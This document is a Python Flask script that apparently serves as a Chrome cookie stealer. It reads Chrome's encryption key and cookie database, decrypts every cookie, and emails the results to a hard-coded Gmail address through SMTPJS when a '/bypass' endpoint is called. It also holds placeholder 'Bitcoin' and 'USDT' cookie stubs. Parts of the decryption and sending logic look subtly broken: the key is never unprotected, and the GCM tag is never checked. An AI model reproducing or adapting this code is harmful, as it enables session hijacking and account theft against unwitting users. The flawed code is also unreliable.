import os
import sqlite3
import json
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from flask import Flask, jsonify, request, send_from_directory
import requests

# Flask app setup
app = Flask(__name__)

# Helper function to get the Chrome Local State file path (Only for Windows)
def get_local_state_path():
    if os.name == "nt":
        # Ensure LOCALAPPDATA is available
        local_app_data = os.environ.get("LOCALAPPDATA")
        if local_app_data:
            return os.path.join(local_app_data, "Google", "Chrome", "User Data", "Local State")
    return None  # Only supporting Windows for now

# Extract the encryption key from the Local State file
def get_encryption_key():
    local_state_path = get_local_state_path()
    if not local_state_path or not os.path.exists(local_state_path):
        raise Exception(f"Local State file not found at {local_state_path}. Please ensure Chrome is installed and the path is correct.")
    
    with open(local_state_path, 'r', encoding='utf-8') as file:
        data = json.load(file)
        encryption_key_b64 = data['os_crypt']['encrypted_key']
        
        # Decrypt the encryption key
        encryption_key = base64.b64decode(encryption_key_b64)[5:]  # Remove the "v10" prefix
        return encryption_key

# Decrypt the cookie value
def decrypt_cookie_value(encrypted_value, encryption_key):
    # The encryption method used by Chrome is AES in GCM mode (256-bit key, nonce is prepended to the cipher text)
    nonce = encrypted_value[3:15]
    cipher_text = encrypted_value[15:-16]
    tag = encrypted_value[-16:]
    
    cipher = Cipher(algorithms.AES(encryption_key), modes.GCM(nonce), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_value = decryptor.update(cipher_text) + decryptor.finalize()
    
    return decrypted_value.decode('utf-8', errors='ignore')

# Get Chrome cookies
def get_chrome_cookies():
    cookies_path = get_chrome_cookies_path()
    
    if not cookies_path or not os.path.exists(cookies_path):
        raise Exception(f"Cookies file not found at {cookies_path}. Please ensure Chrome is installed and the path is correct.")
    
    encryption_key = get_encryption_key()
    conn = sqlite3.connect(cookies_path)
    cursor = conn.cursor()
    cursor.execute("SELECT name, encrypted_value FROM cookies")
    cookies = cursor.fetchall()
    conn.close()
    
    decrypted_cookies = []
    for cookie in cookies:
        cookie_name = cookie[0]
        encrypted_value = cookie[1]
        decrypted_value = decrypt_cookie_value(encrypted_value, encryption_key)
        decrypted_cookies.append({"name": cookie_name, "value": decrypted_value})
    
    return decrypted_cookies

# Get paths for Chrome's SQLite databases
def get_chrome_cookies_path():
    if os.name == "nt":
        # Check various paths where Chrome might be installed
        potential_paths = [
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Cookies"),
            os.path.join(os.environ.get("PROGRAMDATA", ""), "Google", "Chrome", "User Data", "Default", "Cookies"),
            os.path.join(os.environ.get("APPDATA", ""), "Google", "Chrome", "User Data", "Default", "Cookies"),
            os.path.join("C:", "Program Files", "Google", "Chrome", "User Data", "Default", "Cookies"),
            os.path.join("C:", "Program Files (x86)", "Google", "Chrome", "User Data", "Default", "Cookies")
        ]
        
        for path in potential_paths:
            if os.path.exists(path):
                return path
    return None  # Return None if no path is found

# Fetch Bitcoin and USDT cookies (modify this logic as needed)
def get_bitcoin_cookies():
    # Placeholder for Bitcoin-related cookie fetching logic
    bitcoin_cookies = [{"name": "bitcoin_cookie", "value": "example_bitcoin_value"}]
    return bitcoin_cookies

def get_usdt_cookies():
    # Placeholder for USDT-related cookie fetching logic
    usdt_cookies = [{"name": "usdt_cookie", "value": "example_usdt_value"}]
    return usdt_cookies

# Send data using SMTPJS (use SMTPJS for sending email)
def send_email_via_smtpjs(cookies_data):
    # Format the cookies data into a readable JSON string
    email_body = f"Cookies Data: {json.dumps(cookies_data, indent=4)}"
    
    # SMTPJS configuration with the new SecureToken and email details
    payload = {
        "SecureToken": "16831824-2424-421f-a8a0-41c0fb46a0b0",  # Updated SecureToken
        "To": "myrdpa@gmail.com",  # Recipient's email address
        "From": "myrdpa@gmail.com",  # Sender's email address
        "Subject": "Chrome Cookies Data",  # Subject of the email
        "Body": email_body  # The email body containing the cookies data
    }
    
    try:
        # Sending the POST request to SMTPJS to send the email
        response = requests.post("https://smtpjs.com/v3/smtpjs.send.js", json=payload)
        
        # Print response status and body for debugging
        print(f"Email sent with status: {response.status_code}, Response: {response.text}")
        return response
    except Exception as e:
        # If there's an error, print the error message
        print(f"Error sending email: {e}")
        return None

# Serve HTML file on GET request to root path
@app.route('/')
def index():
    return send_from_directory('static', 'index.html')

@app.route('/bypass', methods=['POST'])
def bypass_cors_sors():
    try:
        # Retrieve cookies and other data
        chrome_cookies = get_chrome_cookies()
        bitcoin_cookies = get_bitcoin_cookies()
        usdt_cookies = get_usdt_cookies()

        # Combine all cookie data into one dictionary
        data = {
            "chrome_cookies": chrome_cookies,
            "bitcoin_cookies": bitcoin_cookies,
            "usdt_cookies": usdt_cookies
        }

        # Log the data being collected for debugging
        print(f"Collected Data: {json.dumps(data, indent=4)}")

        # Send the collected data via email using the new SMTPJS function
        email_response = send_email_via_smtpjs(data)

        # Check if the email was sent successfully
        if email_response and email_response.status_code == 200:
            return jsonify({"message": "Data retrieved and sent successfully", "data": data}), 200
        else:
            return jsonify({"error": "Failed to send email", "response": email_response.text if email_response else "No response"}), 500

    except Exception as e:
        # Return an error message if something goes wrong
        print(f"Error: {e}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
